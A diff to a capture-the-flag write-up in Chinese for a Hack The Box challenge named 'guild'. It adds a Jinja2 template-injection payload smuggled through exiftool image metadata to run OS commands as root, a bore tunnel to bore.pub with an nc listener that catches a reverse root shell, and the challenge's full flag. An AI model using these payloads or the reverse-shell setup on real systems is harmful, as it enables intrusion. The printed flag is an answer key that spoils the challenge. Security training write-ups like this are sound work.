@@ -306,6 +306,7 @@ Verified! HTB{mu...5f}
 
 ### 補充
 
+#### 不一樣的 payload
 ```bash
 ──(kali㉿kali)-[~/ctf/guild]
 └─$ exiftool -overwrite_original -artist="{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}" image4.jpg
@@ -334,5 +335,39 @@ Verified! uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),
 只要在 self._TemplateReference__context 透過 [test.py](test.py) env 能夠接到 `__globals__` 的方法都可以
 因為後續就可以靠 `os.popen("cmd").read()` 取得 cmd
 ![alt text](image-5.png)
+
+#### bore tcp tunnel
+因為是 public ip 
+所以第一次嘗試使用 bore 開一個 tcp tunnel
+```bash
+└─$ bore local 3000 --to bore.pub
+2025-11-02T05:50:21.273897Z  INFO bore_cli::client: connected to server remote_port=45273
+2025-11-02T05:50:21.274039Z  INFO bore_cli::client: listening at bore.pub:45273
+2025-11-02T05:50:55.271459Z  INFO proxy{id=b719e5e1-91d5-41ba-b965-e27d00bd486a}: bore_cli::client: new connection
+2025-11-02T05:50:55.494079Z  WARN proxy{id=b719e5e1-91d5-41ba-b965-e27d00bd486a}: bore_cli::client: connection exited with error err=could not connect to localhost:3000
+2025-11-02T05:51:35.206623Z  INFO proxy{id=f240a1c3-a7c5-4bba-95aa-e399c75d609c}: bore_cli::client: new connection
+^C
+
+```
+成功取得 shell
+```bash
+┌──(kali㉿kali)-[~/ctf/guild]
+└─$ nc -nvlp 3000
+listening on [any] 3000 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 59836
+/bin/sh: can't access tty; job control turned off
+/app # id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+/app # ls 
+flag.txt
+guild
+instance
+main.py
+requirements.txt
+website
+/app # cat flag.txt
+HTB{mult1pl3_lo0p5_mult1pl3_h0les_dd4e4fe02ddefd78e2e3939bd3d3e481}/app # ^C
+                          
+```
 
 **Note**: 此 writeup 僅用於教育目的,請勿在未經授權的系統上進行測試。
